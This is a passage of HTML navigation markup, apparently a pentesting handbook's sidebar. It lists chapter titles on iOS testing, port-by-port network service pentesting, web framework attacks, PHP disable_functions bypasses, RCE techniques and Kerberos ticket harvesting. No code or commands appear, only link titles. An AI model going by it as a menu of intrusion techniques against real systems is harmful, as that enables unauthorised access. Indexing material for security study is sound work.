href="../mobile-pentesting/ios-pentesting/burp-configuration-for-ios.html"><strong aria-hidden="true">42.4.</strong> iOS Burp Suite Configuration</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-custom-uri-handlers-deeplinks-custom-schemes.html"><strong aria-hidden="true">42.5.</strong> iOS Custom URI Handlers / Deeplinks / Custom Schemes</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/extracting-entitlements-from-compiled-application.html"><strong aria-hidden="true">42.6.</strong> iOS Extracting Entitlements From Compiled Application</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/frida-configuration-in-ios.html"><strong aria-hidden="true">42.7.</strong> iOS Frida Configuration</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-hooking-with-objection.html"><strong aria-hidden="true">42.8.</strong> iOS Hooking With Objection</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-protocol-handlers.html"><strong aria-hidden="true">42.9.</strong> iOS Protocol Handlers</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-serialisation-and-encoding.html"><strong aria-hidden="true">42.10.</strong> iOS Serialisation and Encoding</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-testing-environment.html"><strong aria-hidden="true">42.11.</strong> iOS Testing Environment</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-uiactivity-sharing.html"><strong aria-hidden="true">42.12.</strong> iOS UIActivity Sharing</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-universal-links.html"><strong aria-hidden="true">42.13.</strong> iOS Universal Links</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-uipasteboard.html"><strong aria-hidden="true">42.14.</strong> iOS UIPasteboard</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/ios-pentesting/ios-webviews.html"><strong aria-hidden="true">42.15.</strong> iOS WebViews</a></li></ol></li><li class="chapter-item expanded "><a href="../mobile-pentesting/cordova-apps.html"><strong aria-hidden="true">43.</strong> Cordova Apps</a></li><li class="chapter-item expanded "><a href="../mobile-pentesting/xamarin-apps.html"><strong aria-hidden="true">44.</strong> Xamarin Apps</a></li><li class="chapter-item expanded affix "><li class="part-title">👽 Network Services Pentesting</li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.html"><strong aria-hidden="true">45.</strong> Pentesting JDWP - Java Debug Wire Protocol</a></li><li class="chapter-item expanded "><a href="../http://hacking-printers.net/wiki/index.php/Main_Page.html"><strong aria-hidden="true">46.</strong> Pentesting Printers</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-sap.html"><strong aria-hidden="true">47.</strong> Pentesting SAP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-voip/index.html"><strong aria-hidden="true">48.</strong> Pentesting VoIP</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-voip/basic-voip-protocols/index.html"><strong aria-hidden="true">48.1.</strong> Basic VoIP Protocols</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-voip/basic-voip-protocols/sip-session-initiation-protocol.html"><strong aria-hidden="true">48.1.1.</strong> SIP (Session Initiation Protocol)</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-remote-gdbserver.html"><strong aria-hidden="true">49.</strong> Pentesting Remote GdbServer</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/7-tcp-udp-pentesting-echo.html"><strong aria-hidden="true">50.</strong> 7/tcp/udp - Pentesting Echo</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-ftp/index.html"><strong aria-hidden="true">51.</strong> 21 - Pentesting FTP</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-ftp/ftp-bounce-attack.html"><strong aria-hidden="true">51.1.</strong> FTP Bounce attack - Scan</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file.html"><strong aria-hidden="true">51.2.</strong> FTP Bounce - Download 2ºFTP file</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-ssh.html"><strong aria-hidden="true">52.</strong> 22 - Pentesting SSH/SFTP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-telnet.html"><strong aria-hidden="true">53.</strong> 23 - Pentesting Telnet</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-smtp/index.html"><strong aria-hidden="true">54.</strong> 25,465,587 - Pentesting SMTP/s</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-smtp/smtp-smuggling.html"><strong aria-hidden="true">54.1.</strong> SMTP Smuggling</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-smtp/smtp-commands.html"><strong aria-hidden="true">54.2.</strong> SMTP - Commands</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/43-pentesting-whois.html"><strong aria-hidden="true">55.</strong> 43 - Pentesting WHOIS</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/49-pentesting-tacacs+.html"><strong aria-hidden="true">56.</strong> 49 - Pentesting TACACS+</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-dns.html"><strong aria-hidden="true">57.</strong> 53 - Pentesting DNS</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/69-udp-tftp.html"><strong aria-hidden="true">58.</strong> 69/UDP TFTP/Bittorrent-tracker</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-finger.html"><strong aria-hidden="true">59.</strong> 79 - Pentesting Finger</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/index.html"><strong aria-hidden="true">60.</strong> 80,443 - Pentesting Web Methodology</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/403-and-401-bypasses.html"><strong aria-hidden="true">60.1.</strong> 403 & 401 Bypasses</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/aem-adobe-experience-cloud.html"><strong aria-hidden="true">60.2.</strong> AEM - Adobe Experience Cloud</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/angular.html"><strong aria-hidden="true">60.3.</strong> Angular</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/apache.html"><strong aria-hidden="true">60.4.</strong> Apache</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/artifactory-hacking-guide.html"><strong aria-hidden="true">60.5.</strong> Artifactory Hacking guide</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/bolt-cms.html"><strong aria-hidden="true">60.6.</strong> Bolt CMS</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/buckets/index.html"><strong aria-hidden="true">60.7.</strong> Buckets</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/buckets/firebase-database.html"><strong aria-hidden="true">60.7.1.</strong> Firebase Database</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/cgi.html"><strong aria-hidden="true">60.8.</strong> CGI</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/dotnetnuke-dnn.html"><strong aria-hidden="true">60.9.</strong> DotNetNuke (DNN)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/drupal/index.html"><strong aria-hidden="true">60.10.</strong> Drupal</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/drupal/drupal-rce.html"><strong aria-hidden="true">60.10.1.</strong> Drupal RCE</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html"><strong aria-hidden="true">60.11.</strong> Electron Desktop Apps</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.html"><strong aria-hidden="true">60.11.1.</strong> Electron contextIsolation RCE via preload code</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.html"><strong aria-hidden="true">60.11.2.</strong> Electron contextIsolation RCE via Electron internal code</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-ipc.html"><strong aria-hidden="true">60.11.3.</strong> Electron contextIsolation RCE via IPC</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/flask.html"><strong aria-hidden="true">60.12.</strong> Flask</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/nodejs-express.html"><strong aria-hidden="true">60.13.</strong> NodeJS Express</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/git.html"><strong aria-hidden="true">60.14.</strong> Git</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/golang.html"><strong aria-hidden="true">60.15.</strong> Golang</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/gwt-google-web-toolkit.html"><strong aria-hidden="true">60.16.</strong> GWT - Google Web Toolkit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/grafana.html"><strong aria-hidden="true">60.17.</strong> Grafana</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/graphql.html"><strong aria-hidden="true">60.18.</strong> GraphQL</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/h2-java-sql-database.html"><strong aria-hidden="true">60.19.</strong> H2 - Java SQL database</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/iis-internet-information-services.html"><strong aria-hidden="true">60.20.</strong> IIS - Internet Information Services</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/imagemagick-security.html"><strong aria-hidden="true">60.21.</strong> ImageMagick Security</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/jboss.html"><strong aria-hidden="true">60.22.</strong> JBOSS</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/jira.html"><strong aria-hidden="true">60.23.</strong> Jira & Confluence</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/joomla.html"><strong aria-hidden="true">60.24.</strong> Joomla</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/jsp.html"><strong aria-hidden="true">60.25.</strong> JSP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/laravel.html"><strong aria-hidden="true">60.26.</strong> Laravel</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/moodle.html"><strong aria-hidden="true">60.27.</strong> Moodle</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/nginx.html"><strong aria-hidden="true">60.28.</strong> Nginx</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/nextjs.html"><strong aria-hidden="true">60.29.</strong> NextJS</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/index.html"><strong aria-hidden="true">60.30.</strong> PHP Tricks</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html"><strong aria-hidden="true">60.30.1.</strong> PHP - Useful Functions & disable_functions/open_basedir bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html"><strong aria-hidden="true">60.30.1.1.</strong> disable_functions bypass - php-fpm/FastCGI</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-dl-function.html"><strong aria-hidden="true">60.30.1.2.</strong> disable_functions bypass - dl function</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-7.0-7.4-nix-only.html"><strong aria-hidden="true">60.30.1.3.</strong> disable_functions bypass - PHP 7.0-7.4 (-nix only)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.html"><strong aria-hidden="true">60.30.1.4.</strong> disable_functions bypass - Imagick &lt;= 3.3.0 PHP &gt;= 5.4 Exploit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-php-5.x-shellshock-exploit.html"><strong aria-hidden="true">60.30.1.5.</strong> disable_functions - PHP 5.x Shellshock Exploit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-php-5.2.4-ioncube-extension-exploit.html"><strong aria-hidden="true">60.30.1.6.</strong> disable_functions - PHP 5.2.4 ionCube extension Exploit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-less-than-5.2.9-on-windows.html"><strong aria-hidden="true">60.30.1.7.</strong> disable_functions bypass - PHP &lt;= 5.2.9 on windows</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.html"><strong aria-hidden="true">60.30.1.8.</strong> disable_functions bypass - PHP 5.2.4 and 5.2.5 PHP cURL</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-safe_mode-bypass-via-proc_open-and-custom-environment-exploit.html"><strong aria-hidden="true">60.30.1.9.</strong> disable_functions bypass - PHP safe_mode bypass via proc_open() and custom environment Exploit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.html"><strong aria-hidden="true">60.30.1.10.</strong> disable_functions bypass - PHP Perl Extension Safe_mode Bypass Exploit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.html"><strong aria-hidden="true">60.30.1.11.</strong> disable_functions bypass - PHP 5.2.3 - Win32std ext Protections Bypass</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-5.2-fopen-exploit.html"><strong aria-hidden="true">60.30.1.12.</strong> disable_functions bypass - PHP 5.2 - FOpen Exploit</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-via-mem.html"><strong aria-hidden="true">60.30.1.13.</strong> disable_functions bypass - via mem</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi.html"><strong aria-hidden="true">60.30.1.14.</strong> disable_functions bypass - mod_cgi</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.html"><strong aria-hidden="true">60.30.1.15.</strong> disable_functions bypass - PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.html"><strong aria-hidden="true">60.30.2.</strong> PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.html"><strong aria-hidden="true">60.30.3.</strong> PHP SSRF</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/prestashop.html"><strong aria-hidden="true">60.31.</strong> PrestaShop</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/python.html"><strong aria-hidden="true">60.32.</strong> Python</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/rocket-chat.html"><strong aria-hidden="true">60.33.</strong> Rocket Chat</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/special-http-headers.html"><strong aria-hidden="true">60.34.</strong> Special HTTP headers</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/code-review-tools.html"><strong aria-hidden="true">60.35.</strong> Source code Review / SAST Tools</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/spring-actuators.html"><strong aria-hidden="true">60.36.</strong> Spring Actuators</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/symphony.html"><strong aria-hidden="true">60.37.</strong> Symfony</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/tomcat/index.html"><strong aria-hidden="true">60.38.</strong> Tomcat</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info.html"><strong aria-hidden="true">60.38.1.</strong> Basic Tomcat Info</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/uncovering-cloudflare.html"><strong aria-hidden="true">60.39.</strong> Uncovering CloudFlare</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/vmware-esx-vcenter....html"><strong aria-hidden="true">60.40.</strong> VMWare (ESX, VCenter...)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/web-api-pentesting.html"><strong aria-hidden="true">60.41.</strong> Web API Pentesting</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/put-method-webdav.html"><strong aria-hidden="true">60.42.</strong> WebDav</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/werkzeug.html"><strong aria-hidden="true">60.43.</strong> Werkzeug / Flask Debug</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-web/wordpress.html"><strong aria-hidden="true">60.44.</strong> Wordpress</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-kerberos-88/index.html"><strong aria-hidden="true">61.</strong> 88tcp/udp - Pentesting Kerberos</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.html"><strong aria-hidden="true">61.1.</strong> Harvesting tickets from Windows</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html"><strong aria-hidden="true">61.2.</strong> Harvesting tickets from Linux</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-pop.html"><strong aria-hidden="true">62.</strong> 110,995 - Pentesting POP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-rpcbind.html"><strong aria-hidden="true">63.</strong> 111/TCP/UDP - Pentesting Portmapper</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/113-pentesting-ident.html"><strong aria-hidden="true">64.</strong> 113 - Pentesting Ident</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-ntp.html"><strong aria-hidden="true">65.</strong> 123/udp - Pentesting NTP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/135-pentesting-msrpc.html"><strong aria-hidden="true">66.</strong> 135, 593 - Pentesting MSRPC</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/137-138-139-pentesting-netbios.html"><strong aria-hidden="true">67.</strong> 137,138,139 - Pentesting NetBios</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-smb/index.html"><strong aria-hidden="true">68.</strong> 139,445 - Pentesting SMB</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-smb/rpcclient-enumeration.html"><strong aria-hidden="true">68.1.</strong> rpcclient enumeration</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-imap.html"><strong aria-hidden="true">69.</strong> 143,993 - Pentesting IMAP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-snmp/index.html"><strong aria-hidden="true">70.</strong> 161,162,10161,10162/udp - Pentesting SNMP</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-snmp/cisco-snmp.html"><strong aria-hidden="true">70.1.</strong> Cisco SNMP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-snmp/snmp-rce.html"><strong aria-hidden="true">70.2.</strong> SNMP RCE</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-irc.html"><strong aria-hidden="true">71.</strong> 194,6667,6660-7000 - Pentesting IRC</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-264-check-point-firewall-1.html"><strong aria-hidden="true">72.</strong> 264 - Pentesting Check Point FireWall-1</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-ldap.html"><strong aria-hidden="true">73.</strong> 389, 636, 3268, 3269 - Pentesting LDAP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/ipsec-ike-vpn-pentesting.html"><strong aria-hidden="true">74.</strong> 500/udp - Pentesting IPsec/IKE VPN</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-modbus.html"><strong aria-hidden="true">75.</strong> 502 - Pentesting Modbus</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/512-pentesting-rexec.html"><strong aria-hidden="true">76.</strong> 512 - Pentesting Rexec</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-rlogin.html"><strong aria-hidden="true">77.</strong> 513 - Pentesting Rlogin</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-rsh.html"><strong aria-hidden="true">78.</strong> 514 - Pentesting Rsh</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/515-pentesting-line-printer-daemon-lpd.html"><strong aria-hidden="true">79.</strong> 515 - Pentesting Line Printer Daemon (LPD)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/584-pentesting-afp.html"><strong aria-hidden="true">80.</strong> 548 - Pentesting Apple Filing Protocol (AFP)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/554-8554-pentesting-rtsp.html"><strong aria-hidden="true">81.</strong> 554,8554 - Pentesting RTSP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/623-udp-ipmi.html"><strong aria-hidden="true">82.</strong> 623/UDP/TCP - IPMI</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-631-internet-printing-protocol-ipp.html"><strong aria-hidden="true">83.</strong> 631 - Internet Printing Protocol(IPP)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/700-pentesting-epp.html"><strong aria-hidden="true">84.</strong> 700 - Pentesting EPP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/873-pentesting-rsync.html"><strong aria-hidden="true">85.</strong> 873 - Pentesting Rsync</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1026-pentesting-rusersd.html"><strong aria-hidden="true">86.</strong> 1026 - Pentesting Rusersd</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1080-pentesting-socks.html"><strong aria-hidden="true">87.</strong> 1080 - Pentesting Socks</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1099-pentesting-java-rmi.html"><strong aria-hidden="true">88.</strong> 1098/1099/1050 - Pentesting Java RMI - RMI-IIOP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1414-pentesting-ibmmq.html"><strong aria-hidden="true">89.</strong> 1414 - Pentesting IBM MQ</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html"><strong aria-hidden="true">90.</strong> 1433 - Pentesting MSSQL - Microsoft SQL Server</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-mssql-microsoft-sql-server/types-of-mssql-users.html"><strong aria-hidden="true">90.1.</strong> Types of MSSQL Users</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html"><strong aria-hidden="true">91.</strong> 1521,1522-1529 - Pentesting Oracle TNS Listener</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1723-pentesting-pptp.html"><strong aria-hidden="true">92.</strong> 1723 - Pentesting PPTP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/1883-pentesting-mqtt-mosquitto.html"><strong aria-hidden="true">93.</strong> 1883 - Pentesting MQTT (Mosquitto)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/nfs-service-pentesting.html"><strong aria-hidden="true">94.</strong> 2049 - Pentesting NFS Service</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-compaq-hp-insight-manager.html"><strong aria-hidden="true">95.</strong> 2301,2381 - Pentesting Compaq/HP Insight Manager</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/2375-pentesting-docker.html"><strong aria-hidden="true">96.</strong> 2375, 2376 Pentesting Docker</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/3128-pentesting-squid.html"><strong aria-hidden="true">97.</strong> 3128 - Pentesting Squid</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/3260-pentesting-iscsi.html"><strong aria-hidden="true">98.</strong> 3260 - Pentesting ISCSI</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/3299-pentesting-saprouter.html"><strong aria-hidden="true">99.</strong> 3299 - Pentesting SAPRouter</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-mysql.html"><strong aria-hidden="true">100.</strong> 3306 - Pentesting Mysql</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-rdp.html"><strong aria-hidden="true">101.</strong> 3389 - Pentesting RDP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/3632-pentesting-distcc.html"><strong aria-hidden="true">102.</strong> 3632 - Pentesting distcc</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/3690-pentesting-subversion-svn-server.html"><strong aria-hidden="true">103.</strong> 3690 - Pentesting Subversion (svn server)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/3702-udp-pentesting-ws-discovery.html"><strong aria-hidden="true">104.</strong> 3702/UDP - Pentesting WS-Discovery</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html"><strong aria-hidden="true">105.</strong> 4369 - Pentesting Erlang Port Mapper Daemon (epmd)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/4786-cisco-smart-install.html"><strong aria-hidden="true">106.</strong> 4786 - Cisco Smart Install</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/4840-pentesting-opc-ua.html"><strong aria-hidden="true">107.</strong> 4840 - OPC Unified Architecture</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5000-pentesting-docker-registry.html"><strong aria-hidden="true">108.</strong> 5000 - Pentesting Docker Registry</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5353-udp-multicast-dns-mdns.html"><strong aria-hidden="true">109.</strong> 5353/UDP Multicast DNS (mDNS) and DNS-SD</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-postgresql.html"><strong aria-hidden="true">110.</strong> 5432,5433 - Pentesting Postgresql</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5439-pentesting-redshift.html"><strong aria-hidden="true">111.</strong> 5439 - Pentesting Redshift</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5555-android-debug-bridge.html"><strong aria-hidden="true">112.</strong> 5555 - Android Debug Bridge</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5601-pentesting-kibana.html"><strong aria-hidden="true">113.</strong> 5601 - Pentesting Kibana</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5671-5672-pentesting-amqp.html"><strong aria-hidden="true">114.</strong> 5671,5672 - Pentesting AMQP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/pentesting-vnc.html"><strong aria-hidden="true">115.</strong> 5800,5801,5900,5901 - Pentesting VNC</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5984-pentesting-couchdb.html"><strong aria-hidden="true">116.</strong> 5984,6984 - Pentesting CouchDB</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5985-5986-pentesting-winrm.html"><strong aria-hidden="true">117.</strong> 5985,5986 - Pentesting WinRM</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/5985-5986-pentesting-omi.html"><strong aria-hidden="true">118.</strong> 5985,5986 - Pentesting OMI</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/6000-pentesting-x11.html"><strong aria-hidden="true">119.</strong> 6000 - Pentesting X11</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/6379-pentesting-redis.html"><strong aria-hidden="true">120.</strong> 6379 - Pentesting Redis</a></li><li class="chapter-item expanded "><a 